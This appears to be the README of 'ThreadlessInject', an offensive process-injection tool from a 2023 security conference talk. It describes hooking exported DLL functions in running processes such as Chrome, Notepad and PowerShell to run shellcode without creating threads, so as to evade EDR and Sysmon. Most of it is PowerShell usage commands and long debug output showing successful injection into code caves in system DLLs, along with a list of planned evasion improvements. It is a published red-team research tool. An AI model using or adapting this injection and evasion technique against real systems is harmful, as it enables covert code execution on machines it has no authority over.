# Threadless Process Injection

From my Bsides Cymru 2023 talk: **[Needles Without the Thread](https://pretalx.com/bsides-cymru-2023-2022/talk/BNC8W3/)**.

> As red teamers, we always find ourselves in a cat and mouse game with the blue team. Many Anti-virus and EDR solutions over the past 10 years have become significantly more advanced at detecting fileless malware activity in a generic way.
>
> Process injection, a technique used for executing code from within the address space of another process is a common method within the offensive operator’s toolbox. Commonly used to mask activity within legitimate processes such as browsers and instant messaging clients already running on the target workstation.
>
> Within the last 2 years, tools such as Sysmon have added new detections and events for process injection along with big improvements in detections within commercial EDR space.
> With this in mind, a new method of injection was researched that would not fall foul to the traditional methods that are often detected today.

# Usage

```powershell
# inject calc-loader-shellcode into Chrome's kernelbase.dll!CreateEventW
.\ThreadlessInject.exe -p (Get-Process "Chrome").id -d kernelbase.dll -e CreateEventW
```

```powershell
# inject ret-0-shellcode into Notepads's kernelbase.dll!MapViewOfFileEx
.\ThreadlessInject.exe -p (Get-Process "Notepad").id -d kernelbase.dll -e MapViewOfFileEx -x "SDHAww=="
```

## Possible Improvements

- [x] Use more covert allocation and write primitives.
- [ ] Use patchless hooking via debugger attachment and hardware breakpoints [(https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock)](https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/).
- [x] Avoid RWX on hooked function.  Hook assembly will need to handle VirtualProtect calls.
- [x] Support any DLL via remote module enumeration.

### Debug Info for NtOpenProcess in PowerShell with Random Code Cave
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\Windows\System32\srvcli.dll at 0x7ffa6f7b0000
[.] Checking 0x7ffa6f7b1000
[.] Checking 0x7ffa6f7bf000
[=] Found code cave of size 246 at 0x7ffa6f7bff0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0033491s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\VERSION.dll at 0x7ffa8b0c0000
[.] Checking 0x7ffa8b0c1000
[.] Checking 0x7ffa8b0c4000
[=] Found code cave of size 246 at 0x7ffa8b0c101a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0057554s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 1 exec sections in current module C:\WINDOWS\System32\win32u.dll at 0x7ffa91110000
[.] Checking 0x7ffa91111000
[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\gpapi.dll at 0x7ffa903f0000
[.] Checking 0x7ffa903f1000
[.] Checking 0x7ffa90404000
[=] Found code cave of size 246 at 0x7ffa903f100b
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0138735s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 1 exec sections in current module C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26090.9-0\MPCLIENT.DLL at 0x7ffa6fe20000
[.] Checking 0x7ffa6fe21000
[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\cscapi.dll at 0x7ffa76ef0000
[.] Checking 0x7ffa76ef1000
[.] Checking 0x7ffa76efa000
[=] Found code cave of size 246 at 0x7ffa76efaf0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0116599s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\Windows\System32\SspiCli.dll at 0x7ffa90070000
[.] Checking 0x7ffa90071000
[.] Checking 0x7ffa90095000
[=] Found code cave of size 246 at 0x7ffa90095f0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0048565s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 3 exec sections in current module C:\WINDOWS\System32\WS2_32.dll at 0x7ffa91da0000
[.] Checking 0x7ffa91da1000
[.] Checking 0x7ffa91df2000
[.] Checking 0x7ffa91df6000
[=] Found code cave of size 246 at 0x7ffa91df6f0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0147853s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 1 exec sections in current module C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll at 0x7ffa3b2b0000
[.] Checking 0x7ffa3b2b1000
[:] Got 1 exec sections in current module C:\WINDOWS\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll at 0x7ffa76150000
[.] Checking 0x7ffa76151000
[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\urlmon.dll at 0x7ffa6fc30000
[.] Checking 0x7ffa6fc31000
[.] Checking 0x7ffa6fd5f000
[=] Found code cave of size 246 at 0x7ffa6fd5ff0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0080868s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 1 exec sections in current module C:\WINDOWS\SYSTEM32\VCRUNTIME140_1_CLR0400.dll at 0x7ffa5f910000
[.] Checking 0x7ffa5f911000
[:] Got 2 exec sections in current module C:\WINDOWS\system32\rsaenh.dll at 0x7ffa8fd10000
[.] Checking 0x7ffa8fd11000
[.] Checking 0x7ffa8fd38000
[=] Found code cave of size 246 at 0x7ffa8fd38f0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0146312s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\WINDOWS\System32\USER32.dll at 0x7ffa91fe0000
[.] Checking 0x7ffa91fe1000
[.] Checking 0x7ffa9209a000
[=] Found code cave of size 246 at 0x7ffa9209af0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0123891s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\WINDOWS\System32\CRYPT32.dll at 0x7ffa911d0000
[.] Checking 0x7ffa911d1000
[.] Checking 0x7ffa912fc000
[=] Found code cave of size 246 at 0x7ffa912fcf0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0125268s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\WINDOWS\System32\OLEAUT32.dll at 0x7ffa92390000
[.] Checking 0x7ffa92391000
[.] Checking 0x7ffa92431000
[=] Found code cave of size 246 at 0x7ffa92431f0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0050492s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 1 exec sections in current module C:\WINDOWS\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll at 0x7ffa76150000
[.] Checking 0x7ffa76151000
[:] Got 1 exec sections in current module C:\WINDOWS\SYSTEM32\VCRUNTIME140_1_CLR0400.dll at 0x7ffa5f910000
[.] Checking 0x7ffa5f911000
[:] Got 1 exec sections in current module C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll at 0x7ffa39820000
[.] Checking 0x7ffa39821000
[:] Got 2 exec sections in current module C:\WINDOWS\System32\OLEAUT32.dll at 0x7ffa92390000
[.] Checking 0x7ffa92391000
[.] Checking 0x7ffa92431000
[=] Found code cave of size 246 at 0x7ffa92431e14
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0133927s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\WINDOWS\SYSTEM32\cscapi.dll at 0x7ffa76ef0000
[.] Checking 0x7ffa76ef1000
[.] Checking 0x7ffa76efa000
[=] Found code cave of size 246 at 0x7ffa76efae14
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0108269s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 1 exec sections in current module C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System.Confe64a9051#\7cf2a06a04cbdaa5c2bb2b4a70cb22b9\System.Configuration.Install.ni.dll at 0x7ffa82d00000
[.] Checking 0x7ffa82d07000
[:] Got 2 exec sections in current module C:\WINDOWS\System32\LINKINFO.dll at 0x7ffa7c120000
[.] Checking 0x7ffa7c121000
[.] Checking 0x7ffa7c126000
[=] Found code cave of size 246 at 0x7ffa7c126f0a
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0123265s and export is restored
PS C:\Users\hacker\source\repos> .\ThreadlessInject.exe -p 3880 -d ntdll.dll -e NtOpenProcess -c -r
[=] Found ntdll.dll!NtOpenProcess @ 0x7ffa94082200
[=] Opened process with id 3880
[=] No shellcode supplied, using calc shellcode
[:] Got 2 exec sections in current module C:\Windows\System32\SspiCli.dll at 0x7ffa90070000
[.] Checking 0x7ffa90071000
[.] Checking 0x7ffa90095000
[=] Found code cave of size 246 at 0x7ffa90095e14
[+] Shellcode injected, Waiting 60s for the hook to be called
[+] Shellcode executed after 1.0054352s and export is restored